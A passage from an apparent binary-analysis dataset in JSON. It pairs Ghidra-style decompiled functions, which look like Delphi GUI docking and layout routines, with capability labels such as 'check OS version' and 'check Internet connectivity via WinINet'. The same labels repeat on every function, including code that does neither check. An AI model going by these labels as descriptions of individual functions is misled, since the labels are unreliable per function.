        "decompiled_code": "\nvoid fcn.00441e8c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *arg_8h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    iVar2 = *(in_EAX + 4);\n    if (iVar2 == 0) {\n        return;\n    }\n    if (*(iVar2 + 0x57) == '\\0') {\n        return;\n    }\n    if (*(*(in_EAX + 0x1c) + 0x6c) != 0) {\n        return;\n    }\n    *(iVar2 + 0x9c) = *(*(in_EAX + 0x14) + 0x10);\n    var_4h = in_EAX;\n    fcn.00441c3c();\n    iVar2 = fcn.00441c3c();\n    cVar1 = fcn.00441e5c(&stack0xfffffffc);\n    if ((cVar1 != '\\0') && (*(*(var_4h + 0x14) + 0x10) != '\\x01')) {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\n    iVar3 = fcn.004420dc();\n    if ((iVar3 == 0) &&\n       (((*(var_4h + 0x14) == *(*(var_4h + 0x1c) + 100) ||\n         (*(*(var_4h + 0x14) + 0x10) != *(*(*(var_4h + 0x1c) + 100) + 0x10))) ||\n        (iVar3 = fcn.00442004(),  *(*(var_4h + 0x1c) + 0x68) <= iVar3)))) {\n        if (*(*(var_4h + 0x14) + 0x10) == *(*(*(var_4h + 0x1c) + 100) + 0x10)) goto code_r0x00441fb2;\n        iVar3 = fcn.00442004();\n        iVar4 = fcn.00442004();\n        if (iVar4 <= iVar3) goto code_r0x00441fb2;\n    }\n    if (*(*(var_4h + 0x14) + 0x10) == '\\x01') {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\ncode_r0x00441fb2:\n    arg_8h = &var_14h;\n    uVar5 = fcn.00441bd0();\n    fcn.00441bd0(uVar5);\n    fcn.00412758(arg_8h, iVar2);\n    (****(var_4h + 0x1c))();\n    fcn.00438eec();\n    return;\n}\n",
        "token_count": 674
    },
    "004422f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004422f8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(arg_8h + -4) == *(in_EAX + 4)) {\n        *(arg_8h + -8) = in_EAX;\n        return;\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 0xc) != 0)) {\n        fcn.004422f8(arg_8h);\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 8) != 0)) {\n        fcn.004422f8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00442350": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00442350(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((param_2 != 0) && (*(in_EAX + 100) != 0)) {\n        fcn.004422f8(&stack0xfffffffc);\n    }\n    return 0;\n}\n",
        "token_count": 92
    },
    "00442454": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00442454(uint arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t in_CL;\n    int32_t in_EDX;\n    uint32_t uVar4;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (*(in_EDX + 0x57) != '\\0') {\n        var_1h._0_1_ = in_CL;\n        if (in_EAX[0xe] == 0) {\n            if (*(in_EAX[0x19] + 8) == 0) {\n                (**(*in_EAX[5] + 0x44))();\n                (**(*in_EAX[5] + 0x8c))();\n                var_10h = var_14h - var_1ch;\n                if (*(in_EAX[5] + 0x5c) != '\\0') {\n                    if (var_18h == var_20h) {\n                        fcn.004394d0();\n                    }\n                    if (var_10h == 0) {\n                        var_10h = fcn.004394bc();\n                    }\n                }\n                fcn.00412758(&var_30h, var_10h);\n                var_20h = var_30h;\n                var_1ch = iStack48;\n                var_18h = iStack44;\n                var_14h = iStack40;\n                (***in_EAX)();\n                fcn.00438eec();\n                iVar1 = fcn.00441ab8();\n                iVar2 = in_EAX[0x19];\n                *(iVar2 + 8) = iVar1;\n                *(iVar1 + 0x14) = iVar2;\n                *(iVar1 + 4) = in_EDX;\n            }\n            else {\n                if ((in_CL == 0) || (in_CL == 5)) {\n                    var_1h._0_1_ = 4;\n                }\n                iVar2 = fcn.00442350();\n                if (iVar2 != 0) {\n                    fcn.0044337c();\n                }\n                var_8h = fcn.00442350();\n                var_9h = *(var_1h + 0x461b9c);\n                iVar2 = fcn.00441adc();\n                if (iVar2 == 1) {\n                    *(in_EAX[0x19] + 0x10) = var_9h;\n                    if (var_9h == 1) {\n                        fcn.00441c3c();\n                        fcn.0044202c();\n                        uVar3 = fcn.00441c3c();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                    else if (var_9h == 2) {\n                        fcn.00441c3c();\n                        fcn.0044202c();\n                        uVar3 = fcn.00441c3c();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                }\n                iVar2 = fcn.00441ab8();\n                *(iVar2 + 4) = in_EDX;\n                if (var_8h == 0) {\n                    uVar4 = in_EAX[0x19] & 0xffffff00 | *(in_EAX[0x19] + 0x10);\n                }\n                else {\n                    uVar4 = *(var_8h + 0x14) & 0xffffff00 | *(*(var_8h + 0x14) + 0x10);\n                }\n                if (var_9h == 0) {\n                    var_9h = uVar4;\n                }\n                if (uVar4 == var_9h) {\n                    fcn.0044280c(*(var_1h + 0x461ba4));\n                }\n                else {\n                    fcn.00442664(*(var_1h + 0x461ba4), uVar4 & 0xffffff00 | var_9h);\n                }\n            }\n        }\n        else {\n            *(in_EAX[0xe] + 4) = in_EDX;\n            fcn.00441e8c();\n        }\n        (**(*in_EAX[5] + 0x7c))();\n    }\n    return;\n}\n",
        "token_count": 1075
    },
    "00442664": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442664(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar2 = fcn.00441ab8();\n    *(iVar2 + 0x10) = arg_ch;\n    if (in_ECX == 0) {\n        fcn.0044202c();\n        uVar3 = fcn.00442004();\n        *(in_EAX + 0x68) = uVar3;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x40) = 0;\n        *(in_EAX + 0x44) = 0x3fe00000;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0x18) = in_EDX;\n            *(in_EDX + 0xc) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.004423b8(0x4436d4);\n            uVar4 = fcn.00442004();\n            iVar2 = uVar4 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((uVar4 & 1) != 0);\n            }\n            *(in_EAX + 0x4c) = iVar2;\n            fcn.004423b8(0x443a58);\n            fcn.00442004();\n            fcn.0044202c();\n        }\n        else {\n            *(iVar2 + 8) = *(in_EAX + 100);\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.004423b8(0x4436d4);\n        }\n        fcn.004423b8(0x443b8c);\n    }\n    else {\n        fcn.00442004();\n        fcn.0044202c();\n        *(iVar2 + 0x14) = *(in_ECX + 0x14);\n        iVar1 = *(in_ECX + 0x18);\n        *(iVar2 + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = iVar2;\n        }\n        iVar1 = *(in_ECX + 0xc);\n        *(iVar2 + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = iVar2;\n        }\n        if (in_ECX == *(*(iVar2 + 0x14) + 8)) {\n            *(*(iVar2 + 0x14) + 8) = iVar2;\n        }\n        *(in_EDX + 0x14) = iVar2;\n        *(in_ECX + 0x14) = iVar2;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            *(in_ECX + 0x18) = in_EDX;\n            *(in_ECX + 0xc) = 0;\n            *(in_EDX + 0xc) = in_ECX;\n        }\n        else {\n            *(iVar2 + 8) = in_ECX;\n            *(in_ECX + 0x18) = 0;\n            *(in_ECX + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = in_ECX;\n        }\n    }\n    fcn.00441cec();\n    fcn.0044207c();\n    fcn.004423b8(0x443b8c);\n    return;\n}\n",
        "token_count": 966
    },
    "00442884": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442884(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x01') {\n        iVar1 = fcn.00442004();\n        if (*(*(arg_8h + -4) + 4) <= iVar1) {\n            iVar1 = fcn.00442004();\n            if (iVar1 - *(*(arg_8h + -8) + 0xc) <= *(*(arg_8h + -4) + 4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x00442a61;\n            }\n        }\n    }\n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x02') {\n        iVar1 = fcn.00442004();\n        if (**(arg_8h + -4) <= iVar1) {\n            iVar1 = fcn.00442004();\n            if (iVar1 - *(*(arg_8h + -8) + 0xc) <= **(arg_8h + -4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x00442a61;\n            }\n        }\n    }\n    if (*(in_EAX + 4) != 0) {\n        iVar1 = fcn.00441bd0();\n        iVar2 = fcn.00441bd0();\n        if (*(*(arg_8h + -8) + 0x1c) == '\\0') {\n            if (((iVar2 <= **(arg_8h + -4)) && (**(arg_8h + -4) <= iVar2 + *(*(arg_8h + -8) + 0x18))) &&\n               (iVar1 <= *(*(arg_8h + -4) + 4))) {\n                iVar2 = fcn.00441c3c();\n                if (*(*(arg_8h + -4) + 4) <= iVar1 + iVar2) {\n                    *(arg_8h + -0x10) = in_EAX;\n                    if (*(*(arg_8h + -4) + 4) < *(*(in_EAX + 4) + 0x44) + 0xf) {\n                        **(arg_8h + -0xc) = 0x14;\n                    }\n                    else {\n                        **(arg_8h + -0xc) = 2;\n                    }\n                }\n            }\n        }\n        else if (((iVar1 <= *(*(arg_8h + -4) + 4)) && (*(*(arg_8h + -4) + 4) <= iVar1 + *(*(arg_8h + -8) + 0x18))) &&\n                (iVar2 <= **(arg_8h + -4))) {\n            iVar1 = fcn.00441c3c();\n            if (**(arg_8h + -4) <= iVar2 + iVar1) {\n                *(arg_8h + -0x10) = in_EAX;\n                if (*(*(in_EAX + 4) + 0x40) + *(*(in_EAX + 4) + 0x48) + -0xf < **(arg_8h + -4)) {\n                    **(arg_8h + -0xc) = 0x14;\n                }\n                else {\n                    **(arg_8h + -0xc) = 2;\n                }\n            }\n        }\n    }\ncode_r0x00442a61:\n    if (*(arg_8h + -0x10) == 0) {\n        iVar1 = fcn.004420dc();\n        if (iVar1 != 0) {\n            iVar1 = arg_8h;\n            fcn.004420dc();\n            fcn.00442884(iVar1);\n        }\n    }\n    if (*(arg_8h + -0x10) == 0) {\n        iVar1 = fcn.00442104();\n        if (iVar1 != 0) {\n            fcn.00442104();\n            fcn.00442884(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 984
    },
    "00442ab0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00442ab0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint lprc;\n    uint pt;\n    uint var_4h;\n    \n    iVar2 = fcn.0043ca38();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            piVar3 = fcn.0043c9fc();\n            if ((*(piVar3 + 0x57) != '\\0') && ((cVar1 = fcn.004033e4(),  cVar1 == '\\0' || (*(piVar3 + 0x1a6) != '\\0'))))\n            {\n                fcn.00412708();\n                (**(*piVar3 + 0x44))(pt, var_4h);\n                iVar4 = sub.user32.dll_PtInRect(&lprc);\n                if (iVar4 != 0) {\n                    return piVar3;\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return NULL;\n}\n",
        "token_count": 266
    },
    "00442b44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00442b44(uint *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    var_10h = 0;\n    *param_1 = 0;\n    iVar1 = fcn.00442ab0(&stack0xfffffffc);\n    if ((iVar1 == 0) || (*(in_EAX + 0x14) != *(iVar1 + 0xa0))) {\n        iVar2 = fcn.00442104();\n        if ((iVar2 != 0) && (iVar1 == 0)) {\n            fcn.00442104();\n            fcn.00442884(arg_8h);\n        }\n    }\n    else {\n        var_10h = fcn.00442350();\n        if (var_10h != 0) {\n            *param_1 = 1;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 259
    },
    "00442bcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442bcc(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.00403fa8();\n    (**(**(arg_8h + -4) + 0xc))();\n    if (0 < in_ECX) {\n        fcn.004045f4();\n        (**(**(arg_8h + -4) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00442c14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00442c9a)\n// WARNING: Removing unreachable block (ram,0x00442cb5)\n// WARNING: Removing unreachable block (ram,0x00442d51)\n// WARNING: Removing unreachable block (ram,0x00442d5f)\n\nvoid __fastcall fcn.00442c14(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x442e0c;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    fcn.004432e4();\n    fcn.004422e0();\n    uVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    (**(*param_2 + 0xc))();\n    (**(*param_2 + 0xc))();\n    if (-1 < var_20h + -1) {\n        do {\n            fcn.00442bcc(&stack0xfffffffc);\n            var_20h = var_20h + -1;\n        } while (var_20h != 0);\n    }\n    (**(*param_2 + 0xc))();\n    var_18h = 0;\n    iVar2 = 0;\n    while ((**(*param_2 + 0xc))(),  var_14h != *0x461bac) {\n        iVar1 = fcn.00441ab8();\n        (**(*param_2 + 0xc))();\n        (**(*param_2 + 0xc))();\n        fcn.00442bcc(&stack0xfffffffc);\n        if (var_14h == 0) {\n            *(in_EAX + 100) = iVar1;\n        }\n        else if (var_14h == var_18h) {\n            *(iVar2 + 0xc) = iVar1;\n            *(iVar1 + 0x18) = iVar2;\n            *(iVar1 + 0x14) = *(iVar2 + 0x14);\n        }\n        else if (var_18h < var_14h) {\n            *(iVar2 + 8) = iVar1;\n            *(iVar1 + 0x14) = iVar2;\n        }\n        else if (var_14h < var_18h) {\n            var_18h = var_18h - var_14h;\n            if (0 < var_18h) {\n                do {\n                    iVar2 = *(iVar2 + 0x14);\n                    var_18h = var_18h + -1;\n                } while (var_18h != 0);\n            }\n            *(iVar2 + 0xc) = iVar1;\n            *(iVar1 + 0x18) = iVar2;\n            *(iVar1 + 0x14) = *(iVar2 + 0x14);\n        }\n        var_18h = var_14h;\n        iVar2 = iVar1;\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.004422e4();\n    return;\n}\n",
        "token_count": 790
    },
    "00442fd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00442fd8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x442ff1;\n    var_4h = fcn.0041d20c();\n    uStack52 = 0x44312e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x44300d;\n    puStack48 = &stack0xfffffffc;\n    fcn.00438108();\n    puStack60 = 0x443015;\n    fcn.0041d510();\n    uStack64 = 0x443111;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x44302d;\n    puStack60 = &stack0xfffffffc;\n    fcn.0041d884();\n    uStack76 = 0x4430f4;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar1 = fcn.0043ca38();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_ch = iVar1;\n        do {\n            iVar1 = fcn.0043c9fc();\n            if ((*(iVar1 + 0x57) != '\\0') && (*(iVar1 + 0xa0) == in_EAX[5])) {\n                fcn.00438ecc();\n                (***in_EAX)();\n                var_1ch = *(iVar1 + 0x40) * 2 - var_1ch;\n                var_18h = *(iVar1 + 0x44) * 2 - var_18h;\n                var_14h = *(iVar1 + 0x48) * -2 + var_14h * 3 + var_1ch * -2;\n                var_10h = *(iVar1 + 0x4c) * -2 + var_10h * 3 + var_18h * -2;\n                (**(*in_EAX + 0x10))(&fcn.00442fd8::var_1ch);\n            }\n            var_8h = var_8h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x4430fb;\n    uStack76 = 0x4430f3;\n    fcn.0041d884();\n    return;\n}\n",
        "token_count": 712
    },
    "0044313c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044313c(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t var_1ch;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.0043e838();\n    if (((in_ECX == 0) || (*(in_ECX + 0x9c) == '\\0')) || (iVar2 < 2)) {\n        uVar3 = fcn.00438f74();\n        arg_8h_00 = &var_1ch;\n        fcn.00438f30();\n        fcn.00412730(arg_8h_00, uVar3);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n        if (0 < iVar2) {\n            if (arg_ch == '\\x01') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[3] = iVar2;\n            }\n            else if (arg_ch == '\\x02') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[1] = iVar2;\n            }\n            else if (arg_ch == '\\x03') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[2] & 1U) != 0);\n                }\n                arg_8h[2] = iVar2;\n            }\n            else if (arg_ch == '\\x04') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[2] & 1U) != 0);\n                }\n                *arg_8h = iVar2;\n            }\n        }\n    }\n    else {\n        var_4h = *(in_ECX + 0x40);\n        var_8h = *(in_ECX + 0x44);\n        uVar4 = *(in_ECX + 0x48);\n        var_ch = *(in_ECX + 0x4c);\n        if (arg_ch - 3U < 2) {\n            uVar1 = uVar4 & 1;\n            uVar4 = uVar4 >> 1;\n            if (uVar4 < 0) {\n                uVar4 = uVar4 + (uVar1 != 0);\n            }\n        }\n        else if (arg_ch - 1U < 2) {\n            var_ch = *(in_ECX + 0x4c) >> 1;\n            if (var_ch < 0) {\n                var_ch = var_ch + ((*(in_ECX + 0x4c) & 1) != 0);\n            }\n        }\n        if (arg_ch == '\\x02') {\n            var_8h = var_8h + var_ch;\n        }\n        else if (arg_ch == '\\x04') {\n            var_4h = var_4h + uVar4;\n        }\n        fcn.00412758(&var_1ch, var_ch);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n    }\n    uVar3 = fcn.0043fd08(0, arg_8h, 2);\n    sub.user32.dll_MapWindowPoints(uVar3);\n    return;\n}\n",
        "token_count": 975
    },
    "0044337c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044337c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack40 = 0x4435e9;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar2 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.00405b0c();\n        uStackY52 = 0x4433bc;\n        fcn.00405b0c(&fcn.0044337c::var_4h);\n        fcn.00404270();\n        fcn.0040b538();\n        fcn.004039e4();\n        puVar2 = puStack36;\n    }\n    puStack36 = puVar2;\n    if (*(param_2 + 4) == 0) {\n        fcn.00405b0c();\n        uStackY52 = 0x4433fd;\n        fcn.00405b0c(&fcn.0044337c::var_ch);\n        fcn.00404270();\n        fcn.0040b538();\n        fcn.004039e4();\n    }\n    iVar3 = fcn.00441adc();\n    if (iVar3 == 1) {\n        iVar3 = *(in_EAX + 100);\n        *(iVar3 + 8) = 0;\n        *(iVar3 + 0x10) = 0;\n    }\n    else if (iVar3 == 2) {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            iVar3 = *(param_2 + 0xc);\n        }\n        if (*(iVar3 + 4) == 0) {\n            if (*(param_2 + 0x14) == *(in_EAX + 100)) {\n                fcn.00442040();\n                uVar4 = fcn.00442004();\n                *(in_EAX + 0x68) = uVar4;\n                fcn.00403258();\n                *(in_EAX + 100) = iVar3;\n                *(iVar3 + 0xc) = 0;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0x14) = 0;\n                fcn.00443b64();\n            }\n            else {\n                iVar1 = *(*(param_2 + 0x14) + 0x18);\n                *(*(iVar3 + 8) + 0x18) = iVar1;\n                if (iVar1 == 0) {\n                    *(*(*(param_2 + 0x14) + 0x14) + 8) = *(iVar3 + 8);\n                }\n                else {\n                    *(iVar1 + 0xc) = *(iVar3 + 8);\n                }\n                iVar3 = *(iVar3 + 8);\n                *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                do {\n                    iVar3 = *(iVar3 + 0xc);\n                    *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                } while (*(iVar3 + 0xc) != 0);\n                *(iVar3 + 0xc) = *(*(param_2 + 0x14) + 0xc);\n                if (*(iVar3 + 0xc) != 0) {\n                    *(*(iVar3 + 0xc) + 0x18) = iVar3;\n                }\n                uStackY52 = 0x443b8c;\n                fcn.004423b8();\n                fcn.00403258();\n                fcn.00403258();\n            }\n        }\n        else {\n            iVar1 = *(param_2 + 0x14);\n            if (*(in_EAX + 100) == iVar1) {\n                *(*(in_EAX + 100) + 8) = iVar3;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0xc) = 0;\n                fcn.00441b88();\n                fcn.0044202c();\n                fcn.00441e8c();\n            }\n            else {\n                *(iVar1 + 0x10) = 0;\n                *(iVar1 + 4) = *(iVar3 + 4);\n                *(iVar1 + 8) = 0;\n                fcn.00403258();\n            }\n            uStackY52 = 0x443b8c;\n            fcn.004423b8();\n        }\n    }\n    else {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            *(*(param_2 + 0x14) + 8) = *(param_2 + 0xc);\n            *(*(param_2 + 0xc) + 0x18) = 0;\n            fcn.00441e8c();\n        }\n        else {\n            *(iVar3 + 0xc) = *(param_2 + 0xc);\n            if (*(param_2 + 0xc) != 0) {\n                *(*(param_2 + 0xc) + 0x18) = iVar3;\n            }\n            fcn.00442004();\n            fcn.00442040();\n            fcn.00441e8c();\n        }\n        uStackY52 = 0x443b8c;\n        fcn.004423b8();\n    }\n    fcn.00403258();\n    *in_FS_OFFSET = uStackY52;\n    uStack44 = 0x4435f0;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 1389
    },
    "00443710": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
